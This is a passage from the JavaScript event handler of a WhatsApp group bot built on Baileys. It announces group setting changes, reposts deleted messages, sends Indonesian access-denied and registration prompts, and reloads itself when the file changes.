                 text = (chat.sDemote || this.sdemote || conn.sdemote || '@user ```is no longer Admin```') 
             text = text.replace('@user', '@' + participants[0].split('@')[0]) 
             if (chat.detect) 
                 this.sendMessage(id, { text, mentions: this.parseMention(text) }) 
             break 
     } 
 }

/**
 * Handle groups update
 * @param {import('@adiwajshing/baileys').BaileysEventMap<unknown>['groups.update']} groupsUpdate 
 */
export async function groupsUpdate(groupsUpdate) {
    if (opts['self'])
        return
    for (const groupUpdate of groupsUpdate) {
        const id = groupUpdate.id
        if (!id) continue
        let chats = global.db.data.chats[id], text = ''
        if (!chats?.detect) continue
        if (groupUpdate.desc) text = (chats.sDesc || this.sDesc || conn.sDesc || '```Description has been changed to```\n@desc').replace('@desc', groupUpdate.desc)
        if (groupUpdate.subject) text = (chats.sSubject || this.sSubject || conn.sSubject || '```Subject has been changed to```\n@subject').replace('@subject', groupUpdate.subject)
        if (groupUpdate.icon) text = (chats.sIcon || this.sIcon || conn.sIcon || '```Icon has been changed to```').replace('@icon', groupUpdate.icon)
        if (groupUpdate.revoke) text = (chats.sRevoke || this.sRevoke || conn.sRevoke || '```Group link has been changed to```\n@revoke').replace('@revoke', groupUpdate.revoke)
        if (!text) continue
        await this.sendMessage(id, { text, mentions: this.parseMention(text) })
    }
}

export async function deleteUpdate(message) {
    try {
        const { fromMe, id, participant } = message
        if (fromMe)
            return
        let msg = this.serializeM(this.loadMessage(id))
        if (!msg)
            return
        let chat = global.db.data.chats[msg.chat] || {}
        if (chat.delete)
            return
            this.sendButton(msg.key.remoteJid, `Terdeteksi *@${participant.split`@`[0]}* telah menghapus pesan.
Untuk mematikan fitur ini, ketik
*.off antidelete*

Untuk menghapus pesan yang dikirim BOT, reply pesan dengan perintah
*.delete*`, author, [['OFF FITURE', '.off antidelete'],['MENU', '.menu']], msg, adReply)
        this.copyNForward(msg.chat, msg).catch(e => console.log(e, msg))
    } catch (e) {
        console.error(e)
    }
}

/**
dfail
 */
global.dfail = (type, m, conn) => {
    let imgr = flaaa.getRandom()
    let nmsr = `👋 Hai *@${m.sender.split("@")[0]}*, `
    let msg = {
        rowner: `${nmsr}\n 
Perintah ini hanya dapat digunakan oleh *OWNER* !`,
        owner: `${nmsr}\n
Perintah ini hanya dapat digunakan oleh *Owner Bot* !`,
        mods: `${nmsr}\n 
Perintah ini hanya dapat digunakan oleh *Moderator* !`,
        premium: `${nmsr}\n
Perintah ini hanya untuk member *Premium* !`,
        group: `${nmsr}\n
Perintah ini hanya dapat digunakan di grup !`,
        private: `${nmsr}\n
Perintah ini hanya dapat digunakan di Chat Pribadi !`,
        admin: `${nmsr}\n
Perintah ini hanya untuk *Admin* grup !`,
        botAdmin: `${nmsr}\n
Jadikan bot sebagai *Admin* untuk menggunakan perintah ini !`,
        nsfw: `${nmsr}\n
NSFW tidak aktif, Silahkan hubungi Team Bot Discussion untuk mengaktifkan fitur ini !`,
        rpg: `${nmsr}\n
RPG tidak aktif, Silahkan hubungi Team Bot Discussion Untuk mengaktifkan fitur ini !`,
        restrict: `${nmsr}\n
Fitur ini di *disable* !`
    }[type]
    if (msg) return conn.sendButton(m.chat, danied, msg, `${imgr + 'Accses Danied'}`, [['MENU', '.menu'],['OWNER', '.menu']],m)
    
     let msgg = {
    	unreg: `${nmsr}\nSilahkan daftar ke database terlebih dahulu untuk menggunakan bot ini lebih lanjut *Click button di bawah*\n\n*Kalian bisa ikuti langkah verify selanjutnya*\n\nLAKI-LAKI ATAU PEREMPUAN ?`
}[type]
if (msgg) return conn.sendButton(m.chat, `${global.htki} VERIFY ${global.htka}`, msgg, `${imgr + 'Verify'}`, [['LAKI-LAKI', '/verify'],['PEREMPUAN', '/verify']],m)
}    
    
let file = global.__filename(import.meta.url, true)
watchFile(file, async () => {
    unwatchFile(file)
    console.log(chalk.redBright("Update 'handler.js'"))
    if (global.reloadHandler) console.log(await global.reloadHandler())
}) 